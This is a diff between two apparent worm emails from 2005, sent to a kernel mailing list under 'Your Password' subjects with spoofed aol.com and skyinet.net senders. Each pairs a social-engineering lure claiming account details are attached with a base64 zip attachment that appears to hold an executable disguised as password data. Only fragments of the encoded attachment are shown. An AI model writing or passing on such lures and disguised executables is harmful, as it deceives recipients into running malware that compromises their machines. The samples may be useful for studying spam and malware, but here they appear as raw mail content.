@@ -1,29 +1,29 @@
-From: info@aol.com
-Subject: Your_Password
-Date: Sun, 18 Dec 2005 18:36:52 UTC
-Message-ID: <f16bd.c8d202c6fdf5@aol.com>
+From: hostmaster@skyinet.net
+Subject: Your Password
+Date: Sun, 18 Dec 2005 19:43:50 UTC
+Message-ID: <e1aa16df2c9.6c947@skyinet.net>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=0c802a354.cd055"
+Content-Type: multipart/mixed; boundary="6e05fd6d30.ca5837ed"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: emailserv@oss.sgi.com
+To: x_mail-list@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=0c802a354.cd055
+--6e05fd6d30.ca5837ed
 
-Account and Password Information are attached!
+Protected message is attached!
 
 
-***** Go to: http://www.aol.com
-***** Email: postman@aol.com
---=0c802a354.cd055
-Content-Type: application/octet-stream; name=reg_pass.zip
+***** Go to: http://www.skyinet.net
+***** Email: postman@skyinet.net
+--6e05fd6d30.ca5837ed
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=0c802a354.cd055--
+--6e05fd6d30.ca5837ed--
